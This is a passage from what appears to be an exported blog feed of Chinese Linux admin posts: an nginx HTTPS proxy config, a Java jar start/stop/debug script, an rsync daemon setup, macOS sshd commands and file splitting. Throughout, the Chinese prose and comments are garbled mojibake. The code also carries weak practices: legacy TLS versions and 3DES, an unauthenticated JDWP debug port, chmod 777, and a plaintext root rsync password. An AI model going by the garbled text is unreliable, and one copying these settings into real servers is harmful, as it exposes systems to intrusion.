<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">upstream server_pool&#123;</span><br><span class="line">	server 127.0.0.1:8080;</span><br><span class="line">&#125;</span><br><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        listen       443 ssl http2; </span><br><span class="line">        server_name  k.32e.co;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#å¦‚æœæ‰“å¼€ï¼Œåˆ™é»˜è®¤å…¨éƒ¨èµ°https</span></span><br><span class="line">        <span class="comment">#ssl on;   </span></span><br><span class="line">        ssl_certificate   /home/cert/k.32e.co/cert.pem;</span><br><span class="line">        ssl_certificate_key  /home/cert/k.32e.co/key.pem;</span><br><span class="line">   </span><br><span class="line">        <span class="comment">#sslæ€§èƒ½è°ƒä¼˜</span></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3;</span><br><span class="line">        ssl_ciphers EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5;</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line">        ssl_session_timeout 10m;</span><br><span class="line">        ssl_session_cache <span class="built_in">builtin</span>:1000 shared:SSL:10m;</span><br><span class="line">        ssl_stapling on;</span><br><span class="line">        ssl_stapling_verify on;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¼€å¯gzipå‹ç¼©</span></span><br><span class="line">        gzip on;</span><br><span class="line">        <span class="comment"># è®¾ç½®ä¸­æ–‡ç¼–ç </span></span><br><span class="line">        charset utf-8,gbk;</span><br><span class="line"></span><br><span class="line">        <span class="comment">#ç¼“å†²åŒºè®¾ç½®</span></span><br><span class="line">        client_max_body_size 100m;</span><br><span class="line">        client_body_buffer_size 2M;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">          proxy_set_header Host <span class="variable">$host</span>;</span><br><span class="line">          proxy_set_header X-Forwarded-For <span class="variable">$remote_addr</span>;</span><br><span class="line"></span><br><span class="line">          proxy_max_temp_file_size 2048M;</span><br><span class="line">          proxy_connect_timeout 600;</span><br><span class="line">          proxy_read_timeout 600;</span><br><span class="line">          proxy_send_timeout 600;</span><br><span class="line"></span><br><span class="line">          proxy_buffering on;</span><br><span class="line">          proxy_buffer_size 4k;</span><br><span class="line">          proxy_buffers 8 1M;</span><br><span class="line">          proxy_busy_buffers_size 2M;</span><br><span class="line"></span><br><span class="line">          proxy_pass http://server_pool;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>2ï¼Œå¦‚æ­¤ï¼Œå°±ç»“æŸäº†ï¼Œç¡®å®å¾ˆç®€å•ï¼Œç­‰åˆ°è¯ä¹¦å¿«è¿‡æœŸçš„æ—¶å€™ï¼Œè„šæœ¬è®¾ç½®çš„å®šæ—¶ä»»åŠ¡ä¼šè‡ªåŠ¨å»æ›´æ–°è¯ä¹¦ï¼Œæˆ‘ä»¬ä¹Ÿå°±ä¸ç”¨å»å…³æ³¨äº†ã€‚</p>
<h4 id="ç”³è¯·é…ç½®ç¤ºä¾‹"><a href="#ç”³è¯·é…ç½®ç¤ºä¾‹" class="headerlink" title="ç”³è¯·é…ç½®ç¤ºä¾‹"></a>ç”³è¯·é…ç½®ç¤ºä¾‹</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">        listen       80;</span><br><span class="line">        server_name  u.32e.co;</span><br><span class="line">        location &#x2F; &#123;</span><br><span class="line">            root   &#x2F;;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>https</tag>
        <tag>acme</tag>
      </tags>
  </entry>
  <entry>
    <title>java-jarç»´æŠ¤è„šæœ¬</title>
    <url>/2019/05/01/shell-java-jar-manage/</url>
    <content><![CDATA[<h4 id="è„šæœ¬å†…å®¹"><a href="#è„šæœ¬å†…å®¹" class="headerlink" title="è„šæœ¬å†…å®¹"></a>è„šæœ¬å†…å®¹</h4><p>ç°åœ¨è¶Šæ¥è¶Šå¤šçš„ç¨‹åºéƒ½ç”¨dockerå®¹å™¨æ¥ç®¡ç†äº†ï¼Œä¸è¿‡ä¾æ—§æœ‰å¾ˆå¤šçš„ç¨‹åºï¼Œæ˜¯ç›´æ¥åœ¨linuxä¸Šä½¿ç”¨jaræ–¹å¼ç®¡ç†çš„ï¼Œé‚£ä¹ˆç¼–å†™ä¸€ä¸ªæ˜“ç”¨çš„è„šæœ¬æ¥ç®¡ç†æ˜¯å¿…ä¸å¯å°‘çš„ã€‚</p>
<p>è„šæœ¬ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">jar_path=<span class="string">&#x27;/home/pro-mall/ex-pro.jar&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># JVMå‚æ•°</span></span><br><span class="line">JVM_OPTS=<span class="string">&quot;-Dspring.profiles.active=prod&quot;</span></span><br><span class="line"><span class="comment"># JVMå‚æ•° debugæ¨¡å¼</span></span><br><span class="line">JVM_OPTS_DEBUG=<span class="string">&quot;-Dspring.profiles.active=prod -Xdebug -Xrunjdwp:server=y,transport=dt_socket,address=10000,suspend=n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">start</span></span>()&#123;</span><br><span class="line">    PID=`ps -ef |grep java|grep <span class="variable">$jar_path</span>|grep -v grep|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [ x<span class="string">&quot;<span class="variable">$PID</span>&quot;</span> != x<span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	    <span class="built_in">echo</span>  -e <span class="string">&quot;\033[0;31m ç¨‹åº <span class="variable">$jar_path</span> æ­£åœ¨è¿è¡Œä¸­ï¼Œè¯·å…ˆåœæ­¢ï¼ \033[0m&quot;</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	    <span class="keyword">if</span> [[ ! -f <span class="string">&quot;<span class="variable">$jar_path</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span>  -e <span class="string">&quot;\033[0;31m <span class="variable">$jar_path</span> ä¸å­˜åœ¨ï¼Œæ— æ³•æ“ä½œå‘½ä»¤ï¼ \033[0m&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            nohup java -jar <span class="variable">$JVM_OPTS</span> <span class="variable">$jar_path</span>  &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">		    <span class="built_in">echo</span>  -e <span class="string">&quot;\033[0;34m å¯åŠ¨ <span class="variable">$jar_path</span> æˆåŠŸï¼\033[0m&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">debug</span></span>()&#123;</span><br><span class="line">    PID=`ps -ef |grep java|grep <span class="variable">$jar_path</span>|grep -v grep|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [ x<span class="string">&quot;<span class="variable">$PID</span>&quot;</span> != x<span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">	    <span class="built_in">echo</span>  -e <span class="string">&quot;\033[0;31m ç¨‹åº <span class="variable">$jar_path</span> æ­£åœ¨è¿è¡Œä¸­ï¼Œè¯·å…ˆåœæ­¢ï¼ \033[0m&quot;</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">        <span class="keyword">if</span> [[ ! -f <span class="string">&quot;<span class="variable">$jar_path</span>&quot;</span> ]]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">echo</span>  -e <span class="string">&quot;\033[0;31m <span class="variable">$jar_path</span> ä¸å­˜åœ¨ï¼Œæ— æ³•æ“ä½œå‘½ä»¤ï¼ \033[0m&quot;</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            nohup java -jar <span class="variable">$JVM_OPTS_DEBUG</span> <span class="variable">$jar_path</span>  &gt; /dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">		    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m Debugæ¨¡å¼ å¯åŠ¨ <span class="variable">$jar_path</span> æˆåŠŸï¼ç«¯å£ï¼š10000 \033[0m&quot;</span></span><br><span class="line">        <span class="keyword">fi</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">stop</span></span>()&#123;</span><br><span class="line">	PID=`ps -ef |grep java|grep <span class="variable">$jar_path</span>|grep -v grep|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> [ x<span class="string">&quot;<span class="variable">$PID</span>&quot;</span> != x<span class="string">&quot;&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">		<span class="built_in">kill</span> -9 <span class="variable">$PID</span></span><br><span class="line">		<span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m <span class="variable">$jar_path</span> å·²åœæ­¢ \033[0m&quot;</span></span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">echo</span> -e <span class="string">&quot;\033[0;31m ç¨‹åº <span class="variable">$jar_path</span> æœªå¯åŠ¨ï¼Œä¸èƒ½æ“ä½œï¼ \033[0m&quot;</span></span><br><span class="line">	<span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">restart</span></span>()&#123;</span><br><span class="line">    stop</span><br><span class="line">    sleep 2</span><br><span class="line">    start</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> status()</span><br><span class="line">&#123;</span><br><span class="line">    PID=`ps -ef |grep java|grep <span class="variable">$jar_path</span>|grep -v grep|wc -l`</span><br><span class="line">    <span class="keyword">if</span> [ <span class="variable">$PID</span> != 0 ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m ç¨‹åº <span class="variable">$jar_path</span> æ­£åœ¨è¿è¡Œä¸­ \033[0m&quot;</span></span><br><span class="line">        PID_NUM=`ps -ef |grep java|grep <span class="variable">$jar_path</span>|grep -v grep|awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>`</span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m ç¨‹åºå¯¹åº”çš„PIDï¼š <span class="variable">$PID_NUM</span> \033[0m&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;31m ç¨‹åº <span class="variable">$jar_path</span> æ²¡æœ‰è¿è¡Œï¼ \033[0m&quot;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">find_help</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;31m è¯·è¾“å…¥æ­£ç¡®çš„æ“ä½œå‘½ä»¤ï¼ \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m å‘½ä»¤å‚æ•°ï¼š&#123;start|stop|restart|status|debug&#125; \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m ç”¨æ³•ï¼š \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m     start    å¯åŠ¨åº”ç”¨ç¨‹åº \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m     stop     åœæ­¢åº”ç”¨ç¨‹åº \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m     restart  é‡å¯åº”ç”¨ç¨‹åº \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m     status   æŸ¥çœ‹åº”ç”¨ç¨‹åºè¿è¡ŒçŠ¶æ€å’ŒPID \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">echo</span> -e <span class="string">&quot;\033[0;34m     debug    Debugæ¨¡å¼å¯åŠ¨åº”ç”¨ç¨‹åº \033[0m&quot;</span></span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$1</span>&quot;</span> = <span class="string">&quot;&quot;</span> ];<span class="keyword">then</span></span><br><span class="line">    find_help;</span><br><span class="line">    <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">    start)</span><br><span class="line">    start;;</span><br><span class="line">    stop)</span><br><span class="line">    stop;;</span><br><span class="line">    restart)</span><br><span class="line">    restart;;</span><br><span class="line">    status)</span><br><span class="line">    status;;</span><br><span class="line">    debug)</span><br><span class="line">    debug;;</span><br><span class="line">    *)</span><br><span class="line">    find_help;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h4 id="è®¾ç½®åˆ«å"><a href="#è®¾ç½®åˆ«å" class="headerlink" title="è®¾ç½®åˆ«å"></a>è®¾ç½®åˆ«å</h4><p>é€šå¸¸æƒ…å†µï¼Œæˆ‘ä»¬è¿è¡Œä¸€ä¸ªè„šæœ¬ï¼Œéœ€è¦ä½¿ç”¨â€œsh + è„šæœ¬è·¯å¾„ + å‚æ•°â€çš„æ–¹å¼ï¼Œç®¡ç†èµ·æ¥å¯èƒ½ä¸å¤ªæ–¹ä¾¿ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸€èˆ¬ä¼šç»™ä»–è®¾ç½®ä¸€ä¸ªåˆ«åæ¥ç®¡ç†ã€‚</p>
<p>è¯­æ³•ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">alias &lt;åˆ«å&gt;&#x3D;&lt;shè„šæœ¬è·¯å¾„&gt;</span><br></pre></td></tr></table></figure>
<p>äº†è§£äº†aliaså‘½ä»¤çš„è¯­æ³•åï¼Œæˆ‘ä»¬ç›´æ¥æ‰§è¡Œå°±å¥½äº†å—ï¼Ÿä¸æ˜¯çš„ï¼Œå¦‚æœç›´æ¥æ‰§è¡Œï¼Œé‚£ä¹ˆåœ¨ä½ å…³é—­sshç»ˆç«¯åé‡æ–°è¿æ¥ï¼Œå‘½ä»¤å°±å¤±æ•ˆå•¦ã€‚<br>æˆ‘ä»¬éœ€è¦å°†è¿™ä¸ªå‘½ä»¤è¿½åŠ åˆ°~/.bashrcæ–‡ä»¶ä¸­ï¼Œæ‰èƒ½ä¿è¯å‘½ä»¤ä¸ä¼šå¤±æ•ˆã€‚<br>æˆ‘ä»¬æ¥è¯•è¯•å§ï¼Œç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod 777 /home/pro-mall/c.sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;alias mall=/home/pro-mall/c.sh&quot;</span> &gt;&gt; ~/.bashrc</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> ~/.bashrc</span><br></pre></td></tr></table></figure>
<p>è®¾ç½®å¥½åˆ«ååçš„ä½¿ç”¨æ–¹æ³•ï¼Œå¦‚ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mall start</span><br><span class="line">mall stop</span><br><span class="line">mall debug</span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>java</category>
        <category>linux</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>ä½¿ç”¨rsyncåŒæ­¥æœåŠ¡å™¨æ•°æ®</title>
    <url>/2020/06/20/shell-rsync/</url>
    <content><![CDATA[<h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>rsyncæ˜¯ä¸€ä¸ªå¿«é€Ÿå’Œéå¸¸çµæ´»çš„æ–‡ä»¶æ‹·è´å·¥å…·ï¼Œå¢é‡æ‹·è´å·¥å…·ã€‚</p>
<p>rsyncçš„ä½¿ç”¨æ–¹å¼ä¸SCPå·®ä¸å¤šï¼Œä½†rsyncç›¸å¯¹SCPæœ‰æ›´å¤šçš„é¢å¤–é€‰é¡¹ã€‚é€šè¿‡rsync â€“helpå‘½ä»¤å¯ä»¥æŸ¥çœ‹æ”¯æŒé€‰é¡¹ç±»å‹çš„å®Œæ•´åˆ—è¡¨å’Œå¸®åŠ©ä¿¡æ¯ã€‚</p>
<p>rsyncé€šå¸¸ä½¿ç”¨SSHæˆ–RSHä¸è¿œç¨‹é€šä¿¡ç³»ç»Ÿï¼Œå®ƒä¸éœ€è¦è®¾ç½®ï¼Œä¹Ÿä¸éœ€è¦ç‰¹æ®Šçš„æƒé™æ¥å®‰è£…ã€‚ä½¿ç”¨sshæ˜¯ç›¸å¯¹æ¯”è¾ƒå®‰å…¨çš„ï¼Œä¹Ÿæ˜¯æ¨èçš„ã€‚</p>
<p>rsyncå®ˆæŠ¤è¿›ç¨‹æ–¹å¼å¯åŠ¨æ˜¯é€šè¿‡æŒ‡å®šçš„é€‰é¡¹â€“daemonæ¥å®Œæˆçš„ï¼Œé»˜è®¤ç«¯å£ä¸º873ã€‚rsyncå¿…é¡»ä»¥rootèº«ä»½è¿è¡Œï¼Œå› ä¸ºå®ƒå¿…é¡»å…·æœ‰è¯»å–å’Œå†™å…¥æ•°æ®ã€æ—¥å¿—å’Œé”å®šæ–‡ä»¶çš„æƒé™ã€‚</p>
<h4 id="å®‰è£…é…ç½®"><a href="#å®‰è£…é…ç½®" class="headerlink" title="å®‰è£…é…ç½®"></a>å®‰è£…é…ç½®</h4><p>1ï¼Œä¸‹è½½å®‰è£…ï¼Œç›´æ¥åˆ°å®˜ç½‘æ‰¾åˆ°ä½ éœ€è¦ä¸‹è½½çš„ç‰ˆæœ¬ï¼Œå¤åˆ¶ä¸‹è½½åœ°å€ï¼Œç›´æ¥åˆ°æœåŠ¡å™¨ä¸Šä½¿ç”¨wgetä¸‹è½½å®‰è£…</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://download.samba.org/pub/rsync/src/rsync-3.1.2.tar.gz</span><br><span class="line"> </span><br><span class="line">tar -zxvf rsync-3.1.2.tar.gz</span><br><span class="line"> </span><br><span class="line"><span class="built_in">cd</span> rsync-3.1.2</span><br><span class="line"> </span><br><span class="line">./configure</span><br><span class="line"> </span><br><span class="line">make</span><br><span class="line"> </span><br><span class="line">make install</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>å®‰è£…å®Œæˆåï¼Œä¼šæŠŠrsyncå‘½ä»¤æ–‡ä»¶è·¯å¾„è¾“å‡ºï¼Œæ³¨æ„è®°ä¸‹æ¥ï¼Œä¸€èˆ¬æ˜¯/usr/local/binç›®å½•ï¼Œç„¶åå¯ä»¥æŸ¥çœ‹ç‰ˆæœ¬å·æ¥æ£€æŸ¥æ˜¯å¦å®‰è£…æˆåŠŸ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync --version</span><br></pre></td></tr></table></figure>


<p>2ï¼Œé…ç½®æ–‡ä»¶</p>
<p>ç›®å‰ï¼Œrsyncå®‰è£…å®Œæˆåï¼Œä¸ä¼šé¢„è®¾ä¸€äº›é…ç½®æ–‡ä»¶ï¼Œç›¸å…³çš„é…ç½®æ–‡ä»¶éƒ½éœ€è¦è‡ªå·±å»æ–°å»ºï¼Œå…³äºé…ç½®æ–‡ä»¶çš„å®˜æ–¹ä»‹ç»åœ°å€ï¼š<br><a href="https://download.samba.org/pub/rsync/rsyncd.conf.html">https://download.samba.org/pub/rsync/rsyncd.conf.html</a></p>
<p>1),åˆ›å»ºç›¸å…³æ–‡ä»¶å¤¹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /etc/rsync/conf</span><br><span class="line">mkdir -p /etc/rsync/<span class="built_in">log</span></span><br><span class="line">mkdir -p /etc/rsync/run</span><br></pre></td></tr></table></figure>
<p>2),åˆ›å»ºrsyncd.secretsç§˜é’¥æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;root:pwd333&quot;</span> &gt;&gt; /etc/rsync/conf/rsyncd.secrets</span><br><span class="line">chmod 600 /etc/rsync/conf/rsyncd.secrets</span><br></pre></td></tr></table></figure>
<p>3),åˆ›å»ºmotdæ¬¢è¿æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-----------------rsync-----------------&quot;</span> &gt;&gt; /etc/rsync/conf/rsyncd.motd</span><br></pre></td></tr></table></figure>
<p>4)ï¼Œåˆ›å»ºrsyncd.confä¸»é…ç½®æ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;uid = nobody</span></span><br><span class="line"><span class="string">gid = nobody</span></span><br><span class="line"><span class="string">use chroot = yes</span></span><br><span class="line"><span class="string">max connections = 100</span></span><br><span class="line"><span class="string">list = yes</span></span><br><span class="line"><span class="string">timeout = 300</span></span><br><span class="line"><span class="string">port = 873</span></span><br><span class="line"><span class="string">log file = /etc/rsync/log/rsync.log</span></span><br><span class="line"><span class="string">pid file = /etc/rsync/run/rsyncd.pid</span></span><br><span class="line"><span class="string">lock file = /etc/rsync/run/rsync.lock</span></span><br><span class="line"><span class="string">motd file = /etc/rsync/conf/rsyncd.motd</span></span><br><span class="line"><span class="string">secrets file = /etc/rsync/conf/rsyncd.secrets</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">[test]</span></span><br><span class="line"><span class="string">path = /data/test</span></span><br><span class="line"><span class="string">comment = test rsync</span></span><br><span class="line"><span class="string">ignore errors </span></span><br><span class="line"><span class="string">auth users = root</span></span><br><span class="line"><span class="string">read only = no</span></span><br><span class="line"><span class="string">hosts allow = ssh.soilove.cn&quot;</span> &gt;&gt; /etc/rsync/conf/rsyncd.conf</span><br></pre></td></tr></table></figure>
<p>3ï¼Œå¯åŠ¨æœåŠ¡ï¼Œé‡æ–°å¯åŠ¨ï¼Œå¦‚æœpidæ–‡ä»¶å­˜åœ¨ä¼šæç¤ºé”™è¯¯ï¼Œæ‰€ä»¥å…ˆåˆ é™¤æ–‡ä»¶å†å¯åŠ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rm /etc/rsync/run/rsyncd.pid</span><br><span class="line"> </span><br><span class="line">/usr/<span class="built_in">local</span>/bin/rsync --daemon --config=/etc/rsync/conf/rsyncd.conf</span><br></pre></td></tr></table></figure>
<p>4ï¼Œåœ¨å¦ä¸€å°æœåŠ¡å™¨ä¸Šä¹ŸæŒ‰ç…§åŒæ ·çš„æ­¥éª¤å®‰è£…å¥½rsyncå³å¯</p>
<h4 id="æ•°æ®æ‹·è´"><a href="#æ•°æ®æ‹·è´" class="headerlink" title="æ•°æ®æ‹·è´"></a>æ•°æ®æ‹·è´</h4><p>1ï¼Œä»è¿œç¨‹æœåŠ¡å™¨æ‹‰å–æ•°æ®ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -vzrtopg --progress root@soilove.cn::<span class="built_in">test</span> /home/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@izuf65v28cpic4oqb2e45ez home]# rsync -vzrtopg â€“progress root@soilove.cn::test &#x2F;home&#x2F;test</span><br><span class="line">â€”â€”â€”â€”â€”â€“rsyncâ€”â€”â€”â€”â€”â€“</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">receiving incremental file list</span><br><span class="line">.&#x2F;</span><br><span class="line">a.txt</span><br><span class="line">2 100% 1.95kB&#x2F;s 0:00:00 (xfr#1, to-chk&#x3D;0&#x2F;2)</span><br><span class="line"></span><br><span class="line">sent 50 bytes received 119 bytes 37.56 bytes&#x2F;sec</span><br><span class="line">total size is 2 speedup is 0.01</span><br></pre></td></tr></table></figure>
<p>2ï¼Œæ‹‰å–æ•°æ®æ—¶æŒ‡å®šå¿½ç•¥æ–‡ä»¶,è¿™é‡Œçš„æŒ‡å®šçš„å¿½ç•¥æ–‡ä»¶æ˜¯é…ç½®çš„/data/testçš„ç›¸å¯¹è·¯å¾„</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -vzrtopg --progress --exclude=cc.txt root@soilove.cn::<span class="built_in">test</span> /home/<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>3ï¼Œæ¨é€æ•°æ®åˆ°è¿œç¨‹æœåŠ¡å™¨ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">rsync -vzrtopg --progress /home/<span class="built_in">test</span>/* root@soilove.cn::<span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>å®˜æ–¹æ–‡æ¡£ï¼š</p>
<p><a href="https://rsync.samba.org/">https://rsync.samba.org</a><br><a href="https://download.samba.org/pub/rsync/rsyncd.conf.html">https://download.samba.org/pub/rsync/rsyncd.conf.html</a></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>å·¥å…·</tag>
        <tag>æ•°æ®åŒæ­¥</tag>
        <tag>rsync</tag>
      </tags>
  </entry>
  <entry>
    <title>mac sshdæœåŠ¡</title>
    <url>/2020/06/27/shell-mac-sshd/</url>
    <content><![CDATA[<p>sshæœåŠ¡æ˜¯æˆ‘ä»¬è¿›è¡Œè¿œç¨‹è¿æ¥æ—¶ï¼Œæœ€å¸¸ç”¨çš„æœåŠ¡ï¼Œä¸è¿‡ä¸€èˆ¬æƒ…å†µä¸‹éƒ½æ˜¯åœ¨linuxä¸Šæ“ä½œï¼Œé‚£ä¹ˆmacä¸Šçš„sshæœåŠ¡å¦‚ä½•å¯åŠ¨å‘¢ï¼Ÿ</p>
<p>å¯åŠ¨sshdæœåŠ¡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo launchctl load -w /System/Library/LaunchDaemons/ssh.plist</span><br></pre></td></tr></table></figure>
<p>åœæ­¢sshdæœåŠ¡ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo launchctl unload -w /System/Library/LaunchDaemons/ssh.plist</span><br></pre></td></tr></table></figure>
<p>æ£€æŸ¥å¯åŠ¨æƒ…å†µï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo launchctl list | grep ssh</span><br></pre></td></tr></table></figure>
<p>æˆåŠŸå¯åŠ¨è¾“å‡ºï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼ï¼</span><br><span class="line">- 0 com.openssh.sshd</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>mac</category>
      </categories>
      <tags>
        <tag>ssh</tag>
      </tags>
  </entry>
  <entry>
    <title>shellæ‹†åˆ†å¤§æ–‡ä»¶</title>
    <url>/2020/06/20/shell-split/</url>
    <content><![CDATA[<h4 id="shellæ‹†åˆ†å¤§æ–‡ä»¶"><a href="#shellæ‹†åˆ†å¤§æ–‡ä»¶" class="headerlink" title="shellæ‹†åˆ†å¤§æ–‡ä»¶"></a>shellæ‹†åˆ†å¤§æ–‡ä»¶</h4><p>1ï¼ŒæŒ‰ç…§è¡Œæ•°æ‹†åˆ†</p>
<p>è¯­æ³•ï¼šsplit -è¡Œæ•° æ–‡ä»¶ /è·¯å¾„/å‰ç¼€</p>
<p>ç¤ºä¾‹ï¼šé’ˆå¯¹a.logæ–‡ä»¶è¿›è¡Œæ‹†åˆ†ï¼Œæ¯6è¡Œæ‹†åˆ†ä¸€ä¸ªæ–‡ä»¶ï¼Œæ‹†åˆ†çš„æ–‡ä»¶å­˜æ”¾åœ¨/tmpä¸‹ï¼ŒæŒ‰ç…§newä¸ºå‰ç¼€ç”Ÿæˆ:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">split -6 a.log /tmp/new</span><br></pre></td></tr></table></figure>

<p>2ï¼ŒæŒ‰ç…§æ–‡ä»¶å¤§å°æ‹†åˆ†</p>
<p>è¯­æ³•ï¼šsplit -b å¤§å° æ–‡ä»¶ /è·¯å¾„/å‰ç¼€</p>
<p>ç¤ºä¾‹ï¼šé’ˆå¯¹a.logæ–‡ä»¶è¿›è¡Œæ‹†åˆ†ï¼Œæ¯10mç”Ÿæˆä¸€ä¸ªæ–‡ä»¶ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">split -b 10m a.log /tmp/new</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>æ‹†åˆ†æ–‡ä»¶</tag>
      </tags>
  </entry>
